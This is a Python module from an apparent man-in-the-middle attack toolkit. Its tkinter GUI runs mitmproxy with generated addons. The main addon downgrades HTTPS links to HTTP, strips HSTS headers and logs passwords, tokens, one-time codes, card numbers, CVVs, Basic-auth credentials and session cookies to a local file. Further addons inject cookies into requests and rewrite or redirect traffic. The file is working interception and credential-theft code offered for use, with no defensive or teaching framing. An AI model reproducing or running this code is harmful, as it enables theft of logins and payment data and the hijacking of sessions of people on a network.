"""SSL Strip Module — HTTPS downgrade via mitmproxy scripts.

Provides SSL stripping capabilities:
  - SSL Strip: Downgrade HTTPS links to HTTP on-the-fly
  - HSTS Bypass: Attempt to bypass HSTS protections
  - Cookie Injection: Inject cookies into stripped sessions
  - Custom mitmproxy addons for traffic manipulation

Uses mitmproxy/mitmdump as the proxy engine with custom Python scripts.
"""
import os
import sys
import time
import json
import threading
import subprocess
import shutil

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

from mitmpro import common
from mitmpro.ai_components import AIHelperTab
from mitmpro.console import ConsoleWidget

OUTPUT_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "output")
try:
    os.makedirs(OUTPUT_DIR, exist_ok=True)
except Exception as e:
    print(f"Error creating output directory: {e}")

MITMDUMP_BIN = shutil.which("mitmdump") or os.path.expanduser(
    "~/.local/bin/mitmdump")
MITMPROXY_BIN = shutil.which("mitmproxy") or os.path.expanduser(
    "~/.local/bin/mitmproxy")

SSLSTRIP_SCRIPT = os.path.join(OUTPUT_DIR, "_sslstrip_addon.py")
SSLSTRIP_INJECT_SCRIPT = os.path.join(OUTPUT_DIR, "_cookie_inject_addon.py")


def _write_sslstrip_script(strip_hsts=True):
    """Write the SSL strip mitmproxy addon script."""
    hsts_const = "STRIP_HSTS = %s\n" % ("True" if strip_hsts else "False")
    script = hsts_const + '''\
"""MITMPro SSL Strip + Credential Capture Addon for mitmproxy.

Downgrades HTTPS links to HTTP in intercepted traffic, strips HSTS headers,
and — crucially — captures every credential (form, JSON, query, basic-auth)
and session cookie that passes through the proxy, persisting them to /output/.
"""
from mitmproxy import http
import re
import os
import json
import time
import threading
from urllib.parse import parse_qs

OUTPUT_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "output")
try:
    os.makedirs(OUTPUT_DIR, exist_ok=True)
except Exception as e:
    print(f"Error creating output directory: {e}")


_CRED_KEYS = ("pass", "pwd", "passwd", "password", "user", "username", "email",
              "login", "log", "session", "token", "otp", "pin", "card", "cvv",
              "account", "secret", "auth")
_lock = threading.Lock()
_captured = []


def _looks_like_creds(data):
    if not isinstance(data, dict):
        return False
    keys = " ".join(str(k).lower() for k in data.keys())
    return any(k in keys for k in _CRED_KEYS)


def _persist():
    try:
        with _lock:
            snapshot = list(_captured)
        with open(os.path.join(OUTPUT_DIR, "credentials.json"), "w",
                  encoding="utf-8") as f:
            json.dump(snapshot, f, indent=2, ensure_ascii=False, default=str)
        with open(os.path.join(OUTPUT_DIR, "all_captures.txt"), "w",
                  encoding="utf-8") as f:
            f.write("MITMPro SSL-Strip Credential Capture Log\\n")
            f.write("Generated: %s | Total: %d\\n" % (time.ctime(), len(snapshot)))
            f.write("=" * 70 + "\\n\\n")
            for c in snapshot:
                f.write("[%s] %s\\n  URL: %s\\n  Creds: %s\\n  Cookies: %s\\n\\n" % (
                    c.get("timestamp", ""), c.get("client", ""),
                    c.get("url", ""),
                    json.dumps(c.get("data", {}), ensure_ascii=False),
                     json.dumps(c.get("cookies", {}), ensure_ascii=False)))
    except Exception as e:
        print(f"Error in _persist: {e}")


class SSLStrip:

    """Strip SSL from responses AND capture credentials from requests."""

    def __init__(self):
        self.stripped = 0
        self.captured = 0

    def request(self, flow: http.HTTPFlow):
        try:
            self._capture(flow)
        except Exception:
            pass

    def _capture(self, flow: http.HTTPFlow):
        req = flow.request
        data = {}
        # Form-encoded body
        try:
            if req.urlencoded_form:
                data.update(dict(req.urlencoded_form))
        except Exception:
            pass
        # JSON body
        if not data:
            try:
                body = req.text or ""
                if body:
                    try:
                        js = json.loads(body)
                        if isinstance(js, dict):
                            data.update({k: v for k, v in js.items()})
                    except Exception:
                        parsed = parse_qs(body)
                        if parsed:
                            data.update({k: (v[0] if len(v) == 1 else v)
                                         for k, v in parsed.items()})
            except Exception:
                pass
        # Query string
        try:
            for k, v in req.query.items():
                data.setdefault(k, v)
        except Exception:
            pass
        # HTTP Basic auth
        auth = req.headers.get("authorization", "")
        if auth.lower().startswith("basic "):
            try:
                import base64
                dec = base64.b64decode(auth.split(" ", 1)[1]).decode("utf-8", "replace")
                if ":" in dec:
                    u, p = dec.split(":", 1)
                    data.setdefault("username", u)
                    data.setdefault("password", p)
            except Exception:
                pass

        if req.method == "POST" or _looks_like_creds(data):
            if not data:
                return
            entry = {
                "timestamp": time.ctime(),
                "client": flow.client_conn.address[0] if flow.client_conn.address else "",
                "url": req.pretty_url,
                "method": req.method,
                "data": data,
                "cookies": dict(req.cookies) if req.cookies else {},
            }
            with _lock:
                _captured.append(entry)
            self.captured += 1
            threading.Thread(target=_persist, daemon=True).start()

    def response(self, flow: http.HTTPFlow):
        # Capture Set-Cookie session tokens from responses
        try:
            sc = flow.response.headers.get_all("set-cookie")
            if sc:
                entry = {
                    "timestamp": time.ctime(),
                    "url": flow.request.pretty_url,
                    "set_cookies": list(sc),
                }
                with _lock:
                    _captured.append(entry)
                threading.Thread(target=_persist, daemon=True).start()
        except Exception:
            pass

        ct = flow.response.headers.get("content-type", "")
        if "text/html" not in ct:
            return

        # Remove HSTS headers so the browser accepts downgraded links (optional)
        if STRIP_HSTS:
            for hdr in ("strict-transport-security", "Strict-Transport-Security"):
                if hdr in flow.response.headers:
                    del flow.response.headers[hdr]

        body = flow.response.text
        if not body:
            return

        original = body
        body = re.sub(
            r'(href|src|action|url)\\s*=\\s*["\\']https://',
            lambda m: m.group(0).replace("https://", "http://"),
            body, flags=re.IGNORECASE)
        body = re.sub(r'https://([a-zA-Z0-9._/-]+)', r'http://\\1', body)

        if body != original:
            flow.response.text = body
            self.stripped += 1

addons = [SSLStrip()]
'''
    try:
        with open(SSLSTRIP_SCRIPT, "w") as f:
            f.write(script)
    except Exception as e:
        print(f"Error writing SSL strip script: {e}")



def _write_cookie_inject_script():
    """Write the cookie injection mitmproxy addon script."""
    script = '''\
"""MITMPro Cookie Inject Addon for mitmproxy.

Injects custom cookies into all HTTP requests passing through.
"""
from mitmproxy import http
import json
import os

COOKIES_FILE = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "output", "inject_cookies.json")

class CookieInject:
    """Inject cookies into requests."""

    def __init__(self):
        self.cookies = {}
        self._load_cookies()

    def _load_cookies(self):
        try:
            if os.path.isfile(COOKIES_FILE):
                with open(COOKIES_FILE, "r") as f:
                    self.cookies = json.load(f)
        except Exception:
            pass

    def request(self, flow: http.HTTPFlow):
        for name, value in self.cookies.items():
            flow.request.cookies[name] = value

addons = [CookieInject()]
'''
    try:
        with open(SSLSTRIP_INJECT_SCRIPT, "w") as f:
            f.write(script)
    except Exception:
        pass


_write_sslstrip_script()
_write_cookie_inject_script()


class SSLStripPanel(ttk.Notebook):
    """SSL Strip panel with mitmproxy-based HTTPS downgrade,
    HSTS bypass, cookie injection, and custom traffic manipulation."""

    def __init__(self, master):
        super().__init__(master)

        self.main_frame = ttk.Frame(self)
        self.add(self.main_frame, text="SSL Strip")
        self.add(AIHelperTab(self, "SSL Strip"), text="AI Helper")

        self._strip_proc = None
        self._mod_proc = None

        self.main_frame.columnconfigure(0, weight=1)
        self.main_frame.rowconfigure(1, weight=1)

        self._build_ui()

    def _build_ui(self):
        nb = ttk.Notebook(self.main_frame)
        nb.grid(row=0, column=0, rowspan=2, sticky="nsew", padx=4, pady=4)
        self.main_frame.rowconfigure(0, weight=1)

        # ---- Tab 1: SSL Strip ----
        strip_frame = ttk.Frame(nb)
        nb.add(strip_frame, text="  SSL Strip  ")
        strip_frame.columnconfigure(1, weight=1)
        strip_frame.rowconfigure(2, weight=1)

        strip_top = ttk.LabelFrame(strip_frame, text="SSL Strip Configuration")
        strip_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        strip_top.columnconfigure(1, weight=1)

        ttk.Label(strip_top, text="Listen Port:").grid(
            row=0, column=0, sticky="w", padx=4)
        self.strip_port = ttk.Entry(strip_top, width=8)
        self.strip_port.grid(row=0, column=1, sticky="w", padx=4, pady=2)
        self.strip_port.insert(0, "8080")

        ttk.Label(strip_top, text="Upstream Proxy:").grid(
            row=1, column=0, sticky="w", padx=4)
        self.strip_upstream = ttk.Entry(strip_top)
        self.strip_upstream.grid(row=1, column=1, sticky="ew", padx=4, pady=2)
        self.strip_upstream.insert(0, "")

        ttk.Label(strip_top, text="Mode:").grid(
            row=2, column=0, sticky="w", padx=4)
        self.strip_mode = ttk.Combobox(
            strip_top, values=["sslstrip", "reverse", "transparent"], width=15)
        self.strip_mode.grid(row=2, column=1, sticky="w", padx=4, pady=2)
        self.strip_mode.set("sslstrip")

        strip_opts = ttk.Frame(strip_top)
        strip_opts.grid(row=3, column=0, columnspan=2, sticky="w", padx=4, pady=2)
        self.strip_hsts = tk.BooleanVar(value=True)
        ttk.Checkbutton(strip_opts, text="Strip HSTS headers",
                        variable=self.strip_hsts).pack(side="left", padx=4)
        self.strip_cookies = tk.BooleanVar(value=True)
        ttk.Checkbutton(strip_opts, text="Inject cookies",
                        variable=self.strip_cookies).pack(side="left", padx=4)
        self.strip_follow = tk.BooleanVar(value=False)
        ttk.Checkbutton(strip_opts, text="Follow redirects",
                        variable=self.strip_follow).pack(side="left", padx=4)

        strip_btns = ttk.Frame(strip_frame)
        strip_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(strip_btns, text="Start SSL Strip",
                   command=self.start_strip).pack(side="left", padx=4)
        ttk.Button(strip_btns, text="Stop",
                   command=self.stop_strip).pack(side="left", padx=4)
        ttk.Button(strip_btns, text="Open mitmproxy UI",
                   command=self.open_ui).pack(side="left", padx=4)

        self.strip_status = ttk.Label(
            strip_btns, text="STOPPED", foreground="#f85149")
        self.strip_status.pack(side="left", padx=10)

        self.strip_console = ConsoleWidget(strip_frame)
        self.strip_console.grid(row=2, column=0, sticky="nsew", padx=4, pady=4)

        # ---- Tab 2: Traffic Modifier ----
        mod_frame = ttk.Frame(nb)
        nb.add(mod_frame, text="  Modify Traffic  ")
        mod_frame.columnconfigure(1, weight=1)
        mod_frame.rowconfigure(2, weight=1)

        mod_top = ttk.LabelFrame(mod_frame, text="Traffic Modification Rules")
        mod_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        mod_top.columnconfigure(1, weight=1)

        ttk.Label(mod_top, text="URL Pattern:").grid(
            row=0, column=0, sticky="w", padx=4)
        self.mod_pattern = ttk.Entry(mod_top)
        self.mod_pattern.grid(row=0, column=1, sticky="ew", padx=4, pady=2)
        self.mod_pattern.insert(0, ".*")

        ttk.Label(mod_top, text="Action:").grid(
            row=1, column=0, sticky="w", padx=4)
        self.mod_action = ttk.Combobox(
            mod_top,
            values=["add_header", "remove_header", "replace_body",
                    "redirect", "drop_request"],
            width=20)
        self.mod_action.grid(row=1, column=1, sticky="w", padx=4, pady=2)
        self.mod_action.set("add_header")

        ttk.Label(mod_top, text="Value:").grid(
            row=2, column=0, sticky="w", padx=4)
        self.mod_value = ttk.Entry(mod_top)
        self.mod_value.grid(row=2, column=1, sticky="ew", padx=4, pady=2)
        self.mod_value.insert(0, "")

        mod_btns = ttk.Frame(mod_frame)
        mod_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(mod_btns, text="Add Rule",
                   command=self.add_modify_rule).pack(side="left", padx=4)
        ttk.Button(mod_btns, text="Clear Rules",
                   command=self.clear_modify_rules).pack(side="left", padx=4)
        ttk.Button(mod_btns, text="Start Modifier",
                   command=self.start_modifier).pack(side="left", padx=4)
        ttk.Button(mod_btns, text="Stop",
                   command=self.stop_modifier).pack(side="left", padx=4)

        self.mod_status = ttk.Label(
            mod_btns, text="STOPPED", foreground="#f85149")
        self.mod_status.pack(side="left", padx=10)

        self._modify_rules = []

        self.mod_console = ConsoleWidget(mod_frame)
        self.mod_console.grid(row=2, column=0, sticky="nsew", padx=4, pady=4)

        # ---- Tab 3: Cookie Manager ----
        cookie_frame = ttk.Frame(nb)
        nb.add(cookie_frame, text="  Cookies  ")
        cookie_frame.columnconfigure(1, weight=1)
        cookie_frame.rowconfigure(2, weight=1)

        cookie_top = ttk.LabelFrame(cookie_frame, text="Cookie Injection")
        cookie_top.grid(row=0, column=0, sticky="ew", padx=4, pady=4)
        cookie_top.columnconfigure(1, weight=1)

        ttk.Label(cookie_top, text="Cookie Name:").grid(
            row=0, column=0, sticky="w", padx=4)
        self.cookie_name = ttk.Entry(cookie_top)
        self.cookie_name.grid(row=0, column=1, sticky="ew", padx=4, pady=2)

        ttk.Label(cookie_top, text="Cookie Value:").grid(
            row=1, column=0, sticky="w", padx=4)
        self.cookie_value = ttk.Entry(cookie_top)
        self.cookie_value.grid(row=1, column=1, sticky="ew", padx=4, pady=2)

        cookie_btns = ttk.Frame(cookie_frame)
        cookie_btns.grid(row=1, column=0, sticky="ew", padx=4, pady=2)
        ttk.Button(cookie_btns, text="Add Cookie",
                   command=self.add_cookie).pack(side="left", padx=4)
        ttk.Button(cookie_btns, text="Load from JSON",
                   command=self.load_cookies_json).pack(side="left", padx=4)
        ttk.Button(cookie_btns, text="Clear All",
                   command=self.clear_cookies).pack(side="left", padx=4)
        ttk.Button(cookie_btns, text="Export",
                   command=self.export_cookies).pack(side="left", padx=4)

        self.cookie_tree = ttk.Treeview(
            cookie_frame, columns=("Name", "Value"), show="headings", height=6)
        self.cookie_tree.heading("Name", text="Name")
        self.cookie_tree.heading("Value", text="Value")
        self.cookie_tree.column("Name", width=200)
        self.cookie_tree.column("Value", width=400)
        self.cookie_tree.grid(row=2, column=0, sticky="nsew", padx=4, pady=4)

    # -------------------------------------------------------- SSL Strip
    def start_strip(self, **kwargs):
        if self._strip_proc and self._strip_proc.poll() is None:
            return

        port = self.strip_port.get().strip()
        try:
            int(port)
        except ValueError:
            messagebox.showerror("Error", "Port must be a number.")
            return

        if not os.path.isfile(MITMDUMP_BIN):
            messagebox.showerror(
                "mitmdump not found",
                f"mitmdump not found at: {MITMDUMP_BIN}\n\n"
                "Install: pip3 install mitmproxy")
            return

        _write_sslstrip_script(self.strip_hsts.get())

        cmd = [MITMDUMP_BIN, "-p", port, "-s", SSLSTRIP_SCRIPT, "--set", "ssl_insecure=true"]

        if self.strip_cookies.get():
            cmd.extend(["-s", SSLSTRIP_INJECT_SCRIPT])

        upstream = self.strip_upstream.get().strip()
        if upstream:
            cmd.extend(["--mode", f"upstream:{upstream}"])

        if self.strip_follow.get():
            cmd.extend(["--set", "connection_strategy=lazy"])

        self._strip_proc = self.strip_console.start(cmd)
        if self._strip_proc:
            self.strip_status.config(text="RUNNING", foreground="#2ea043")
        else:
            self.strip_status.config(text="Failed to start", foreground="#f85149")

    def stop_strip(self, **kwargs):
        self.strip_console.stop()
        self._strip_proc = None
        self.strip_status.config(text="STOPPED", foreground="#f85149")

    def open_ui(self, **kwargs):
        if os.path.isfile(MITMPROXY_BIN):
            try:
                port = self.strip_port.get().strip() or "8080"
                subprocess.Popen(
                    [MITMPROXY_BIN, "-p", port],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception as e:
                messagebox.showerror("Error", str(e))
        else:
            messagebox.showinfo(
                "mitmproxy not found",
                f"mitmproxy not found at: {MITMPROXY_BIN}")

    # -------------------------------------------------------- Traffic Modifier
    def add_modify_rule(self, **kwargs):
        pattern = self.mod_pattern.get().strip()
        action = self.mod_action.get().strip()
        value = self.mod_value.get().strip()

        if not pattern or not action:
            return

        rule = {"pattern": pattern, "action": action, "value": value}
        self._modify_rules.append(rule)
        self._generate_modifier_script()
        self.mod_console.start(
            ["echo", f"[+] Rule added: {action} on {pattern}"])

    def clear_modify_rules(self, **kwargs):
        self._modify_rules.clear()
        self._generate_modifier_script()

    def _generate_modifier_script(self):
        rules_json = json.dumps(self._modify_rules)
        script = f'''\
"""MITMPro Traffic Modifier Addon."""
from mitmproxy import http
import re
import json

RULES = {rules_json}

class TrafficModifier:
    def request(self, flow: http.HTTPFlow):
        for rule in RULES:
            pattern = rule.get("pattern", ".*")
            action = rule.get("action", "")
            value = rule.get("value", "")
            if not re.search(pattern, flow.request.pretty_url):
                continue
            if action == "add_header":
                parts = value.split(":", 1)
                if len(parts) == 2:
                    flow.request.headers[parts[0].strip()] = parts[1].strip()
            elif action == "remove_header":
                if value in flow.request.headers:
                    del flow.request.headers[value]
            elif action == "redirect":
                flow.request.url = value
            elif action == "drop_request":
                flow.kill()

    def response(self, flow: http.HTTPFlow):
        for rule in RULES:
            pattern = rule.get("pattern", ".*")
            action = rule.get("action", "")
            value = rule.get("value", "")
            if not re.search(pattern, flow.request.pretty_url):
                continue
            if action == "remove_header":
                if value in flow.response.headers:
                    del flow.response.headers[value]
            elif action == "replace_body":
                flow.response.text = value

addons = [TrafficModifier()]
'''
        mod_script_path = os.path.join(OUTPUT_DIR, "_traffic_modifier_addon.py")
        try:
            with open(mod_script_path, "w") as f:
                f.write(script)
        except Exception:
            pass

    def start_modifier(self, **kwargs):
        if self._mod_proc and self._mod_proc.poll() is None:
            return

        mod_script_path = os.path.join(OUTPUT_DIR, "_traffic_modifier_addon.py")
        if not os.path.isfile(mod_script_path):
            self._generate_modifier_script()

        port = self.strip_port.get().strip() or "8080"
        if not os.path.isfile(MITMDUMP_BIN):
            messagebox.showerror("Error", "mitmdump not found.")
            return

        cmd = [MITMDUMP_BIN, "-p", port, "-s", mod_script_path,
               "--set", "ssl_insecure=true"]
        self._mod_proc = self.mod_console.start(cmd)
        self.mod_status.config(text="RUNNING", foreground="#2ea043")
    def stop_modifier(self, **kwargs):
        self.mod_console.stop()
        self._mod_proc = None
        self.mod_status.config(text="STOPPED", foreground="#f85149")

    # -------------------------------------------------------- Cookie Manager
    def add_cookie(self, **kwargs):
        name = self.cookie_name.get().strip()
        value = self.cookie_value.get().strip()
        if not name:
            return
        self.cookie_tree.insert("", "end", values=(name, value))
        self._save_cookies_to_file()

    def load_cookies_json(self, **kwargs):
        from tkinter import filedialog
        path = filedialog.askopenfilename(
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")])
        if not path:
            return
        try:
            with open(path, "r") as f:
                data = json.load(f)
            if isinstance(data, dict):
                for k, v in data.items():
                    self.cookie_tree.insert("", "end", values=(k, str(v)))
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        self.cookie_tree.insert(
                            "", "end",
                            values=(item.get("name", ""),
                                    item.get("value", "")))
            self._save_cookies_to_file()
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def clear_cookies(self, **kwargs):
        self.cookie_tree.delete(*self.cookie_tree.get_children())
        self._save_cookies_to_file()

    def export_cookies(self, **kwargs):
        from tkinter import filedialog
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json")])
        if not path:
            return
        cookies = {}
        for item in self.cookie_tree.get_children():
            vals = self.cookie_tree.item(item, "values")
            if len(vals) >= 2:
                cookies[vals[0]] = vals[1]
        try:
            with open(path, "w") as f:
                json.dump(cookies, f, indent=2)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _save_cookies_to_file(self):
        cookies = {}
        for item in self.cookie_tree.get_children():
            vals = self.cookie_tree.item(item, "values")
            if len(vals) >= 2:
                cookies[vals[0]] = vals[1]
        try:
            with open(SSLSTRIP_INJECT_SCRIPT.replace(
                    "_cookie_inject_addon.py", "inject_cookies.json"), "w") as f:
                json.dump(cookies, f, indent=2)
        except Exception:
            pass

    # -------------------------------------------------------- cleanup
    def destroy(self):
        self.stop_strip()
        self.stop_modifier()
        super().destroy()
